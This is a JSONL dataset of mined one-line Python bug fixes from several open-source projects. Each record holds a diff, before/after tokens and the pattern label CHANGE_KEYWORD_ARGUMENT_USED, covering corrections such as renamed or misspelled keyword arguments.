{"project": "pymc3", "commit_sha": "5e6e299cfb8cfadaf3a90ce01d33094e5b8a3fd0", "parent_sha": "63faab8e4dcce6cdcd6637e6ed687d11a2418c64", "file_path": "pymc3/tests/test_gp.py", "project_url": "https://github.com/sk38897/pymc3", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -415,4 +415,4 @@ class TestGP(SeededTest):\n         Z = np.linspace(0, 1, 5)[:, None]\n         with model:\n             out = gp.sample_gp(tr[-3:], gp=random_test, X_values=Z, obs_noise=False,\n-                               random_seed=self.random_seed, progressbar=False, jitter=True)\n+                               random_seed=self.random_seed, progressbar=False, chol_const=True)\n", "before": "out = gp . sample_gp ( tr [ - 3 : ] , gp = random_test , X_values = Z , obs_noise = False , random_seed = self . random_seed , progressbar = False , jitter = True )", "after": "out = gp . sample_gp ( tr [ - 3 : ] , gp = random_test , X_values = Z , obs_noise = False , random_seed = self . random_seed , progressbar = False , chol_const = True )", "sstub_pattern": "CHANGE_KEYWORD_ARGUMENT_USED", "edit_script": "[[\"Update\", [\"identifier:jitter\", 3, 81, 3, 87], \"chol_const\"]]"}
{"project": "question-generation", "commit_sha": "54f27a7e5fdc0ebbcd65a3a9a59a5b2bd3c29794", "parent_sha": "0d5e1067e23f358c5692720bcf2e15cd28c076c1", "file_path": "src/seq2seq_model.py", "project_url": "https://github.com/sk38897/question-generation", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -204,7 +204,7 @@ class Seq2SeqModel(SQuADModel):\n             self.switch = tf.layers.dense(switch_h2, 1, activation=tf.sigmoid, kernel_initializer=tf.initializers.orthogonal())\n \n         # build overall prediction prob vector\n-        self.q_hat_shortlist = tf.nn.softmax(logits,axis=2)\n+        self.q_hat_shortlist = tf.nn.softmax(logits,dim=2) #NOTE kwarg dim is deprecated in favour of axis, but blaze == 1.4\n \n         self.q_hat = tf.concat([(1-self.switch)*self.q_hat_shortlist,self.switch*self.attention], axis=2)\n \n", "before": "self . q_hat_shortlist = tf . nn . softmax ( logits , axis = 2 )", "after": "self . q_hat_shortlist = tf . nn . softmax ( logits , dim = 2 )", "sstub_pattern": "CHANGE_KEYWORD_ARGUMENT_USED", "edit_script": "[[\"Update\", [\"identifier:axis\", 3, 53, 3, 57], \"dim\"]]"}
{"project": "umo", "commit_sha": "f33f5530c7d3d12eaec8d78d1e6420794ffa906a", "parent_sha": "91e63c18bf754a31ea2d43f88b77a705d3bcd709", "file_path": "disciplines/views.py", "project_url": "https://github.com/voffan/umo", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -458,7 +458,7 @@ class StudentsScoresView(PermissionRequiredMixin, ListView):\n                     add_brs(course, GroupList.objects.filter(student__id__in=students_to_add), checkpoints)\n                 context['object_list'] = BRSpoints.objects.filter(course__id=self.kwargs['pk'], student__id__in=group_students.values_list('student__id', flat=True)).select_related('student', 'checkpoint')\n         else:\n-            students = set(context['object_list'].values_list('student__id', falt=True))\n+            students = set(context['object_list'].values_list('student__id', flat=True))\n             group_students = group_students.filter(student__id__in=students)\n         #elif len(context['object_list']) // 3\n         context['points'] = {}\n", "before": "else : students = set ( context [ 'object_list' ] . values_list ( 'student__id' , falt = True ) )", "after": "else : students = set ( context [ 'object_list' ] . values_list ( 'student__id' , flat = True ) )", "sstub_pattern": "CHANGE_KEYWORD_ARGUMENT_USED", "edit_script": "[[\"Update\", [\"identifier:falt\", 3, 78, 3, 82], \"flat\"]]"}
{"project": "umo", "commit_sha": "b60538512ec2c5e68b24d921ff0d2d561d99bf6b", "parent_sha": "4362a3e7b1cfb279d43246545e5db053813b5eb2", "file_path": "students/views.py", "project_url": "https://github.com/voffan/umo", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -72,7 +72,7 @@ class StudentListView(StudentsList):\n                         g.id = sg.id_group\n                     g.begin_year = Year.objects.get_or_create(year=eduprogyear.year)[0]\n                     g.Name = sg.name\n-                    g.program = EduProgram.objects.filter(specialization__code=eduprogyear.id_dop.id_spec.code, year__year__lte=eduprogyear.year).order_by('-year__year').first()\n+                    g.program = EduProgram.objects.filter(specialization__code=eduprogyear.id_dop.id_spec.code, year__year=eduprogyear.year).order_by('-year__year').first()\n                     if g.program is not None:\n                         g.cathedra = g.program.cathedra\n                     g.save()\n", "before": "g . program = EduProgram . objects . filter ( specialization__code = eduprogyear . id_dop . id_spec . code , year__year__lte = eduprogyear . year ) . order_by ( '-year__year' ) . first ( )", "after": "g . program = EduProgram . objects . filter ( specialization__code = eduprogyear . id_dop . id_spec . code , year__year = eduprogyear . year ) . order_by ( '-year__year' ) . first ( )", "sstub_pattern": "CHANGE_KEYWORD_ARGUMENT_USED", "edit_script": "[[\"Update\", [\"identifier:year__year__lte\", 3, 113, 3, 128], \"year__year\"]]"}
{"project": "chainer", "commit_sha": "3d8abb5ea409bf2d41c3ad5b80ba8ab938109f36", "parent_sha": "db7845a65e5a29b2feaaef0a48e068d035758572", "file_path": "tests/chainer_tests/functions_tests/pooling_tests/test_max_pooling_nd.py", "project_url": "https://github.com/mingxiaoh/chainer", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -73,7 +73,7 @@ class TestMaxPoolingND(unittest.TestCase):\n         x = chainer.Variable(x_data)\n         y = functions.max_pooling_nd(x, ksize, stride=stride, pad=pad,\n                                      cover_all=self.cover_all,\n-                                     user_cudnn=use_cudnn)\n+                                     use_cudnn=use_cudnn)\n         self.assertEqual(y.data.dtype, self.dtype)\n         y_data = cuda.to_cpu(y.data)\n \n", "before": "y = functions . max_pooling_nd ( x , ksize , stride = stride , pad = pad , cover_all = self . cover_all , user_cudnn = use_cudnn )", "after": "y = functions . max_pooling_nd ( x , ksize , stride = stride , pad = pad , cover_all = self . cover_all , use_cudnn = use_cudnn )", "sstub_pattern": "CHANGE_KEYWORD_ARGUMENT_USED", "edit_script": "[[\"Update\", [\"identifier:user_cudnn\", 3, 38, 3, 48], \"use_cudnn\"]]"}
{"project": "rlpy3", "commit_sha": "4cf8257112a3b04286843b048891097e1de66432", "parent_sha": "11f65562871a9a803854bcbecb5ce0f6e8fa6a38", "file_path": "rlpy/domains/system_administrator.py", "project_url": "https://github.com/kngwyu/rlpy3", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -163,7 +163,7 @@ class SystemAdministrator(Domain):\n                 )  # Add an edge between each neighbor\n             self.networkPos = nx.circular_layout(self.networkGraph)\n             nx.draw_networkx_nodes(self.networkGraph, self.networkPos, node_color=\"w\")\n-            nx.draw_networkx_edges(self.networkGraph, self.networkPos, edges_color=\"k\")\n+            nx.draw_networkx_edges(self.networkGraph, self.networkPos, edge_color=\"k\")\n             nx.draw_networkx_labels(self.networkGraph, self.networkPos)\n             plt.show()\n         else:\n", "before": "nx . draw_networkx_edges ( self . networkGraph , self . networkPos , edges_color = \"k\" )", "after": "nx . draw_networkx_edges ( self . networkGraph , self . networkPos , edge_color = \"k\" )", "sstub_pattern": "CHANGE_KEYWORD_ARGUMENT_USED", "edit_script": "[[\"Update\", [\"identifier:edges_color\", 3, 72, 3, 83], \"edge_color\"]]"}
{"project": "tensorflow", "commit_sha": "ffe24e657bc9dc365f98de17e7118d94d88c3705", "parent_sha": "e6b27e8be2e7ff1e503d294a8c6cc83c8c854327", "file_path": "tensorflow/contrib/rnn/python/ops/rnn_cell.py", "project_url": "https://github.com/b0noI/tensorflow", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -2891,7 +2891,7 @@ class WeightNormLSTMCell(rnn_cell_impl.RNNCell):\n \n     output_size = weight.get_shape().as_list()[1]\n     g = vs.get_variable(name, [output_size], dtype=weight.dtype)\n-    return nn_impl.l2_normalize(weight, dim=0) * g\n+    return nn_impl.l2_normalize(weight, axis=0) * g\n \n   def _linear(self,\n               args,\n", "before": "return nn_impl . l2_normalize ( weight , dim = 0 ) * g", "after": "return nn_impl . l2_normalize ( weight , axis = 0 ) * g", "sstub_pattern": "CHANGE_KEYWORD_ARGUMENT_USED", "edit_script": "[[\"Update\", [\"identifier:dim\", 3, 41, 3, 44], \"axis\"]]"}
{"project": "tensorflow", "commit_sha": "7a2ef3d93358fbf0b006d00acb25cbf451ff1bee", "parent_sha": "0bb7a191a33222c44ff50a3c74b550ee72f8b0e4", "file_path": "tensorflow/examples/learn/text_classification_cnn.py", "project_url": "https://github.com/b0noI/tensorflow", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -73,7 +73,7 @@ def cnn_model(features, labels, mode):\n         kernel_size=FILTER_SHAPE2,\n         padding='VALID')\n     # Max across each filter to get useful features for classification.\n-    pool2 = tf.squeeze(tf.reduce_max(conv2, 1), squeeze_dims=[1])\n+    pool2 = tf.squeeze(tf.reduce_max(conv2, 1), axis=[1])\n \n   # Apply regular WX + B and classification.\n   logits = tf.layers.dense(pool2, MAX_LABEL, activation=None)\n", "before": "padding = 'VALID' ) pool2 = tf . squeeze ( tf . reduce_max ( conv2 , 1 ) , squeeze_dims = [ 1 ] )", "after": "padding = 'VALID' ) pool2 = tf . squeeze ( tf . reduce_max ( conv2 , 1 ) , axis = [ 1 ] )", "sstub_pattern": "CHANGE_KEYWORD_ARGUMENT_USED", "edit_script": "[[\"Update\", [\"identifier:squeeze_dims\", 3, 49, 3, 61], \"axis\"]]"}
{"project": "djangogirls", "commit_sha": "dd5f26ea6a248ffbaa0b632bc88eebc9a73c8f4a", "parent_sha": "91e6b0e3dd303258b83f2d77de4b6c2cf01d4f7d", "file_path": "core/admin.py", "project_url": "https://github.com/djangogirlsjobs/djangogirls", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -75,7 +75,7 @@ class SponsorAdmin(SortableModelAdmin):\n         qs = super(SponsorAdmin, self).queryset(request)\n         if request.user.is_superuser:\n             return qs\n-        return qs.filter(page__event__team__in=[request.user,])\n+        return qs.filter(event_page_content__page__event__team__in=[request.user,])\n \n     def get_form(self, request, obj=None, **kwargs):\n         form = super(SponsorAdmin, self).get_form(request, obj, **kwargs)\n", "before": "return qs . filter ( page__event__team__in = [ request . user , ] )", "after": "return qs . filter ( event_page_content__page__event__team__in = [ request . user , ] )", "sstub_pattern": "CHANGE_KEYWORD_ARGUMENT_USED", "edit_script": "[[\"Update\", [\"identifier:page__event__team__in\", 3, 26, 3, 47], \"event_page_content__page__event__team__in\"]]"}
{"project": "sedd", "commit_sha": "cc119a041390860ba9f1b21fb77f4c5f75c96476", "parent_sha": "cb6bb82b700ff90b9ec4d999b5b3b4ceb10f8522", "file_path": "proyecto/app/controllers.py", "project_url": "https://github.com/miltonlab/sedd", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -549,7 +549,7 @@ def encuesta_grabar(request):\n         par_academico = request.session['docente']\n         # Si ya ha contestado este cuestionario y se intenta grabar otra vez\n         if docente_evaluar.evaluaciones.filter(cuestionario=evaluacion.cuestionario,\n-                                               par_academico=par_academico).count() > 0:\n+                                               parAcademico=par_academico).count() > 0:\n             request.session['evaluacion'] = None\n             return render_to_response('app/encuesta_finalizada.html', datos, \n                                       context_instance=RequestContext(request))     \n", "before": "if docente_evaluar . evaluaciones . filter ( cuestionario = evaluacion . cuestionario , par_academico = par_academico ) . count ( ) > 0 : request . session [ 'evaluacion' ] = None return render_to_response ( 'app/encuesta_finalizada.html' , datos , context_instance = RequestContext ( request ) )", "after": "if docente_evaluar . evaluaciones . filter ( cuestionario = evaluacion . cuestionario , parAcademico = par_academico ) . count ( ) > 0 : request . session [ 'evaluacion' ] = None return render_to_response ( 'app/encuesta_finalizada.html' , datos , context_instance = RequestContext ( request ) )", "sstub_pattern": "CHANGE_KEYWORD_ARGUMENT_USED", "edit_script": "[[\"Update\", [\"identifier:par_academico\", 3, 48, 3, 61], \"parAcademico\"]]"}
{"project": "zamboni", "commit_sha": "70522211555cf25d2ff6214f3ee2d4c832358ab7", "parent_sha": "bcc9fff0ff9f92faa6355a16cd0bc071330ce72f", "file_path": "apps/users/views.py", "project_url": "https://github.com/AutomatedTester/zamboni", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -270,7 +270,7 @@ def profile(request, user_id):\n         own_coll = []\n     if user.display_collections_fav:\n         fav_coll = Collection.objects.filter(\n-            collectionsubscription__user=user,\n+            subscriptions__user=user,\n             listed=True).order_by('name')\n     else:\n         fav_coll = []\n", "before": "fav_coll = Collection . objects . filter ( collectionsubscription__user = user , listed = True ) . order_by ( 'name' )", "after": "fav_coll = Collection . objects . filter ( subscriptions__user = user , listed = True ) . order_by ( 'name' )", "sstub_pattern": "CHANGE_KEYWORD_ARGUMENT_USED", "edit_script": "[[\"Update\", [\"identifier:collectionsubscription__user\", 3, 13, 3, 41], \"subscriptions__user\"]]"}
{"project": "desisim", "commit_sha": "3122b77cab80f49143f81c0e6066345753d65fcf", "parent_sha": "59c36cec8c1f2db280f3143824de97fbea23f6bf", "file_path": "py/desisim/spec_qa/redshifts.py", "project_url": "https://github.com/desihub/desisim", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -487,7 +487,7 @@ def obj_fig(simz_tab, objtype, summ_stats, outfile=None):\n                     xval = xval[gdy]\n                     yval = yval[gdy]\n                     xmin,xmax=0.5,20\n-                    ax.set_xscale(\"log\", nonposy='clip')\n+                    ax.set_xscale(\"log\", nonposx='clip')\n                 else:\n                     lbl = '{:s} (Mag)'.format(gdz_tab[0]['FILTER'][0])\n                     xval = gdz_tab['MAG'][:,0]\n", "before": "ax . set_xscale ( \"log\" , nonposy = 'clip' )", "after": "ax . set_xscale ( \"log\" , nonposx = 'clip' )", "sstub_pattern": "CHANGE_KEYWORD_ARGUMENT_USED", "edit_script": "[[\"Update\", [\"identifier:nonposy\", 3, 42, 3, 49], \"nonposx\"]]"}
{"project": "freeipa", "commit_sha": "138ae4abe7d4737ae2e1c6526476b8be009178db", "parent_sha": "41352ef9388dbba408762d64b60a6a1f53048bcd", "file_path": "ipaserver/install/ipa_server_certinstall.py", "project_url": "https://github.com/Gauravtalreja1/freeipa", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -174,7 +174,7 @@ class ServerCertInstall(admintool.AdminTool):\n     def replace_kdc_cert(self):\n         # pass in `realm` to perform `NSSDatabase.verify_kdc_cert_validity()`\n         cert, key, ca_cert = self.load_pkcs12(\n-            ca_chain_fname=paths.CA_BUNDLE_PEM, realm=api.env.realm)\n+            ca_chain_fname=paths.CA_BUNDLE_PEM, realm_name=api.env.realm)\n \n         self.replace_key_cert_files(\n             cert, key, paths.KDC_CERT, paths.KDC_KEY, ca_cert,\n", "before": "cert , key , ca_cert = self . load_pkcs12 ( ca_chain_fname = paths . CA_BUNDLE_PEM , realm = api . env . realm )", "after": "cert , key , ca_cert = self . load_pkcs12 ( ca_chain_fname = paths . CA_BUNDLE_PEM , realm_name = api . env . realm )", "sstub_pattern": "CHANGE_KEYWORD_ARGUMENT_USED", "edit_script": "[[\"Update\", [\"identifier:realm\", 3, 49, 3, 54], \"realm_name\"]]"}
{"project": "freeipa", "commit_sha": "9bbc798741c2872eaa6cc29d92c8b90104d65ee8", "parent_sha": "1fc21e980bb901bf71f7ee024cdbb15c1caec3a7", "file_path": "ipaserver/install/server/upgrade.py", "project_url": "https://github.com/freeipa-pr-ci2/freeipa", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -1306,7 +1306,7 @@ def add_default_caacl(ca):\n \n         if not api.Command.caacl_find()['result']:\n             api.Command.caacl_add(u'hosts_services_caIPAserviceCert',\n-                hostcategory=u'all', usercategory=u'all')\n+                hostcategory=u'all', servicecategory=u'all')\n             api.Command.caacl_add_profile(u'hosts_services_caIPAserviceCert',\n                 certprofile=(u'caIPAserviceCert',))\n \n", "before": "api . Command . caacl_add ( u'hosts_services_caIPAserviceCert' , hostcategory = u'all' , usercategory = u'all' )", "after": "api . Command . caacl_add ( u'hosts_services_caIPAserviceCert' , hostcategory = u'all' , servicecategory = u'all' )", "sstub_pattern": "CHANGE_KEYWORD_ARGUMENT_USED", "edit_script": "[[\"Update\", [\"identifier:usercategory\", 3, 38, 3, 50], \"servicecategory\"]]"}
{"project": "redash", "commit_sha": "8e5ba804f66b1679b46445d444382eafa50b796f", "parent_sha": "173f9ba7e8209f4c9b8a82add07e7f4569a246fc", "file_path": "redash/__init__.py", "project_url": "https://github.com/jupe/redash", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -110,7 +110,7 @@ def create_app():\n     app = Flask(__name__,\n                 template_folder=settings.STATIC_ASSETS_PATH,\n                 static_folder=settings.STATIC_ASSETS_PATH,\n-                static_path='/static')\n+                static_url_path='/static')\n \n     # Make sure we get the right referral address even behind proxies like nginx.\n     app.wsgi_app = ProxyFix(app.wsgi_app, settings.PROXIES_COUNT)\n", "before": "app = Flask ( __name__ , template_folder = settings . STATIC_ASSETS_PATH , static_folder = settings . STATIC_ASSETS_PATH , static_path = '/static' )", "after": "app = Flask ( __name__ , template_folder = settings . STATIC_ASSETS_PATH , static_folder = settings . STATIC_ASSETS_PATH , static_url_path = '/static' )", "sstub_pattern": "CHANGE_KEYWORD_ARGUMENT_USED", "edit_script": "[[\"Update\", [\"identifier:static_path\", 3, 17, 3, 28], \"static_url_path\"]]"}
{"project": "luigi", "commit_sha": "978a07fb71aa8a41422a56b6d908494b2d2089ac", "parent_sha": "668fac194e5311b19a17780a7ec581216d78f3e7", "file_path": "test/worker_test.py", "project_url": "https://github.com/ouanixi/luigi", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -9,7 +9,7 @@ class WorkerTest(unittest.TestCase):\n     def setUp(self):\n         InstanceCache.clear()\n         self.sch = CentralPlannerScheduler(retry_delay=100, remove_delay=1000, client_disconnect_delay=10)\n-        self.w = Worker(scheduler=self.sch)\n+        self.w = Worker(sch=self.sch)\n         self.time = time.time\n \n     def tearDown(self):\n", "before": "self . w = Worker ( scheduler = self . sch )", "after": "self . w = Worker ( sch = self . sch )", "sstub_pattern": "CHANGE_KEYWORD_ARGUMENT_USED", "edit_script": "[[\"Update\", [\"identifier:scheduler\", 3, 25, 3, 34], \"sch\"]]"}
{"project": "dpq", "commit_sha": "31cc6c9bf544c37dd9c130ef7b10fa93a0804a0e", "parent_sha": "7cb10352008154f52f421ec02f645ca30237a3a2", "file_path": "src/queue/views.py", "project_url": "https://github.com/OleksiiZhmyrov/dpq", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -208,7 +208,7 @@ def history(request, branch):\n     branch_obj = Branch.objects.get(name=branch)\n-    items_list = QueueRecord.objects.filter(branch=branch_obj, hidden__iexact=False,\n+    items_list = QueueRecord.objects.filter(branch=branch_obj, hidden=False,\n                                             status__in=[QueueRecord.DONE, QueueRecord.REVERTED,\n                                                         QueueRecord.SKIPPED]).order_by(\n         '-done_date')\n", "before": "items_list = QueueRecord . objects . filter ( branch = branch_obj , hidden__iexact = False , status__in = [ QueueRecord . DONE , QueueRecord . REVERTED , QueueRecord . SKIPPED ] ) . order_by ( '-done_date' )", "after": "items_list = QueueRecord . objects . filter ( branch = branch_obj , hidden = False , status__in = [ QueueRecord . DONE , QueueRecord . REVERTED , QueueRecord . SKIPPED ] ) . order_by ( '-done_date' )", "sstub_pattern": "CHANGE_KEYWORD_ARGUMENT_USED", "edit_script": "[[\"Update\", [\"identifier:hidden__iexact\", 1, 64, 1, 78], \"hidden\"]]"}
{"project": "manticore-tastypie-social", "commit_sha": "9d109c98646803982b2ce68f0b2e47e0fdfc36cc", "parent_sha": "fb6d847c32ab3b621c0dad7fd02ff535ecf90f11", "file_path": "manticore_tastypie_social/resources.py", "project_url": "https://github.com/yeti/manticore-tastypie-social", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -132,7 +132,7 @@ class AirshipTokenResource(ManticoreModelResource):\n         # Delete other usages of this token (i.e. multiple accounts on one device)\n         AirshipToken.objects.filter(token=bundle.data['token']).delete()\n \n-        bundle.obj = AirshipToken(user=bundle.request.user.get_profile(), token=bundle.data['token'])\n+        bundle.obj = AirshipToken(user_profile=bundle.request.user.get_profile(), token=bundle.data['token'])\n         bundle.obj.save()\n             # except urbanairship.AirshipFailure:\n             #     raise BadRequest(\"Failed Authentication\")\n", "before": "bundle . obj = AirshipToken ( user = bundle . request . user . get_profile ( ) , token = bundle . data [ 'token' ] )", "after": "bundle . obj = AirshipToken ( user_profile = bundle . request . user . get_profile ( ) , token = bundle . data [ 'token' ] )", "sstub_pattern": "CHANGE_KEYWORD_ARGUMENT_USED", "edit_script": "[[\"Update\", [\"identifier:user\", 3, 35, 3, 39], \"user_profile\"]]"}
{"project": "conference", "commit_sha": "98866d2e4b8115ef1845eb4447775fdc17bf44e7", "parent_sha": "a7a687e692e4167f14587d5dec2efb3185591469", "file_path": "templatetags/conference.py", "project_url": "https://github.com/pythonitalia/conference", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -238,7 +238,7 @@ def conference_talks(parser, token):\n             speaker = self._get_var(self.speaker, context)\n             conference = self._get_var(self.conference, context)\n             if speaker:\n-                talks = talks.filter(speaker = speaker)\n+                talks = talks.filter(speakers = speaker)\n             context[self.var_name] = talks\n             return ''\n     return TalksNode(speaker, conference, var_name)\n", "before": "talks = talks . filter ( speaker = speaker )", "after": "talks = talks . filter ( speakers = speaker )", "sstub_pattern": "CHANGE_KEYWORD_ARGUMENT_USED", "edit_script": "[[\"Update\", [\"identifier:speaker\", 3, 38, 3, 45], \"speakers\"]]"}
{"project": "eventoL", "commit_sha": "ff08f93223fd68250107c5806e6673faf4b0bfc9", "parent_sha": "eb9fe4dc66879a98e090127fbdb720acb3183874", "file_path": "manager/api/views.py", "project_url": "https://github.com/Flisol-VE/eventoL", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -31,7 +31,7 @@ def sede_full_report(request, sede_url):\n         'talks': [t.talk_proposal.title for t in talks],\n         'staff': get_staff(talk_proposals, installers, collaborators),\n         'attendees': reduces.attendees(attendees),\n-        'installations': reduces.installations(Installation.objects.filter(sede=sede))\n+        'installations': reduces.installations(Installation.objects.filter(attendee__sede=sede))\n     }\n     return HttpResponse(json.dumps(sede_data), content_type=\"application/json\")\n \n", "before": "reduces . installations ( Installation . objects . filter ( sede = sede ) )", "after": "reduces . installations ( Installation . objects . filter ( attendee__sede = sede ) )", "sstub_pattern": "CHANGE_KEYWORD_ARGUMENT_USED", "edit_script": "[[\"Update\", [\"identifier:sede\", 3, 76, 3, 80], \"attendee__sede\"]]"}
{"project": "DeusCoNWeT", "commit_sha": "39513aa4c76d1f61d0cf73666cca25fb889c08af", "parent_sha": "11f404e076a3c9e9408e19ef1569886e52f69c4f", "file_path": "src/manejador_pb.py", "project_url": "https://github.com/polymer-spain/DeusCoNWeT", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -301,7 +301,7 @@ class UserListHandler(webapp2.RequestHandler):\n       user = Usuario.query(Usuario.email == email).get()\n       if user == None:\n         # Creates the new user\n-        newUser = Usuario(nombre = name, identificador = name , email = email, lista_Redes = [], lista_grupos = [])\n+        newUser = Usuario(nombre = name, identificador = name , email = email, lista_Redes = [], lista_Grupos = [])\n         self.response.status(200)\n       else:\n         # Returns a Not Modified status\n", "before": "newUser = Usuario ( nombre = name , identificador = name , email = email , lista_Redes = [ ] , lista_grupos = [ ] )", "after": "newUser = Usuario ( nombre = name , identificador = name , email = email , lista_Redes = [ ] , lista_Grupos = [ ] )", "sstub_pattern": "CHANGE_KEYWORD_ARGUMENT_USED", "edit_script": "[[\"Update\", [\"identifier:lista_grupos\", 3, 98, 3, 110], \"lista_Grupos\"]]"}
{"project": "superset", "commit_sha": "256a521bf1083222f16ecbc02ac3d01522ebc9e3", "parent_sha": "a626f994bf6550a6587a82a0c304aa9f8731a6e9", "file_path": "superset/cli.py", "project_url": "https://github.com/tc-dc/superset", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -192,7 +192,7 @@ def worker(workers):\n         celery_app.conf.update(CELERYD_CONCURRENCY=workers)\n     elif config.get(\"SUPERSET_CELERY_WORKERS\"):\n         celery_app.conf.update(\n-            worker_concurrency=config.get(\"SUPERSET_CELERY_WORKERS\"))\n+            CELERYD_CONCURRENCY=config.get(\"SUPERSET_CELERY_WORKERS\"))\n \n     worker = celery_worker.worker(app=celery_app)\n     worker.run()\n", "before": "celery_app . conf . update ( worker_concurrency = config . get ( \"SUPERSET_CELERY_WORKERS\" ) )", "after": "celery_app . conf . update ( CELERYD_CONCURRENCY = config . get ( \"SUPERSET_CELERY_WORKERS\" ) )", "sstub_pattern": "CHANGE_KEYWORD_ARGUMENT_USED", "edit_script": "[[\"Update\", [\"identifier:worker_concurrency\", 3, 13, 3, 31], \"CELERYD_CONCURRENCY\"]]"}
{"project": "p2pool-dgb", "commit_sha": "ac18eda65895b8b67752c80562e6fce77af9affd", "parent_sha": "21ad926bb4e982c9e2f0bed486a0544a0f108b40", "file_path": "p2pool/p2p.py", "project_url": "https://github.com/mcpool/p2pool-dgb", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -237,7 +237,7 @@ class Protocol(bitcoin_p2p.BaseProtocol):\n                 else:\n                     raise ValueError(self.mode)\n         if share1bs: self.send_share1bs(share1bs=share1bs)\n-        if share0s: self.send_share0s(share0s=share0s)\n+        if share0s: self.send_share0s(hashes=share0s)\n         if share1as: self.send_share1as(share1as=share1as)\n     \n     def connectionLost(self, reason):\n", "before": "self . send_share0s ( share0s = share0s )", "after": "self . send_share0s ( hashes = share0s )", "sstub_pattern": "CHANGE_KEYWORD_ARGUMENT_USED", "edit_script": "[[\"Update\", [\"identifier:share0s\", 3, 39, 3, 46], \"hashes\"]]"}
{"project": "meteo", "commit_sha": "deea6df37d32ca05303ff2e0f3b4275a9a82df17", "parent_sha": "74a017aa236ece7931065548eee69e3dc8eb338a", "file_path": "add_to_files.py", "project_url": "https://github.com/cdutsov/meteo", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -111,7 +111,7 @@ def main():\n                                             time=datetime.datetime.now())\n             point.extensions = data\n             gpx_segment.points.append(point)\n-            if (datetime.datetime.now() - start_time) > datetime.timedelta(seconds=10):\n+            if (datetime.datetime.now() - start_time) > datetime.timedelta(minutes=10):\n                 start_time = datetime.datetime.now()\n                 with open(\"tracks/track\" + datetime.datetime.now().isoformat(), \"w\") as f:\n                     print \"GPX file printed!\"\n", "before": "if ( datetime . datetime . now ( ) - start_time ) > datetime . timedelta ( seconds = 10 ) : start_time = datetime . datetime . now ( ) with open ( \"tracks/track\" + datetime . datetime . now ( ) . isoformat ( ) , \"w\" ) as f : print \"GPX file printed!\"", "after": "if ( datetime . datetime . now ( ) - start_time ) > datetime . timedelta ( minutes = 10 ) : start_time = datetime . datetime . now ( ) with open ( \"tracks/track\" + datetime . datetime . now ( ) . isoformat ( ) , \"w\" ) as f : print \"GPX file printed!\"", "sstub_pattern": "CHANGE_KEYWORD_ARGUMENT_USED", "edit_script": "[[\"Update\", [\"identifier:seconds\", 3, 76, 3, 83], \"minutes\"]]"}
{"project": "huxley", "commit_sha": "9aef1f357a3319a31bd1995f462eb356011b6a93", "parent_sha": "4bb97ee1ccd794f0ad3a1eb6b3a2be593bf25833", "file_path": "huxley/shortcuts.py", "project_url": "https://github.com/jaketibbetts/huxley", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -15,7 +15,7 @@ def render_template(request, template, context=None):\n \n def render_json(data):\n     '''Return an HttpResponse object containing json-encoded data.'''\n-    return HttpResponse(simplejson.dumps(data), mimetype='application/json')\n+    return HttpResponse(simplejson.dumps(data), content_type='application/json')\n \n def pairwise(iterable):\n     '''Group the elements of the given interable into 2-tuples.'''\n", "before": "return HttpResponse ( simplejson . dumps ( data ) , mimetype = 'application/json' )", "after": "return HttpResponse ( simplejson . dumps ( data ) , content_type = 'application/json' )", "sstub_pattern": "CHANGE_KEYWORD_ARGUMENT_USED", "edit_script": "[[\"Update\", [\"identifier:mimetype\", 3, 49, 3, 57], \"content_type\"]]"}
{"project": "lidar2dems", "commit_sha": "8be03ffb9311375690cf116e255a5e3d1eb8a259", "parent_sha": "9090991360d3d70bea445d4196bba8309a99ee33", "file_path": "l2d/scripts/process_voxels.py", "project_url": "https://github.com/Applied-GeoSolutions/lidar2dems", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -30,7 +30,7 @@ def main():\n     parser.add_argument(\n \t'--voxtype', help='Type of return data to use for calculations', nargs='*', default=['count'])\n     parser.add_argument(\n-\t'--metric', helep='Metric name user defined, used for naming output image', default=None)\n+\t'--metric', help='Metric name user defined, used for naming output image', default=None)\n     parser.add_argument(\n \t'--start', help='Low height of relative density region of interest', default=['1'])\n     parser.add_argument(\n", "before": "parser . add_argument ( '--metric' , helep = 'Metric name user defined, used for naming output image' , default = None )", "after": "parser . add_argument ( '--metric' , help = 'Metric name user defined, used for naming output image' , default = None )", "sstub_pattern": "CHANGE_KEYWORD_ARGUMENT_USED", "edit_script": "[[\"Update\", [\"identifier:helep\", 3, 14, 3, 19], \"help\"]]"}
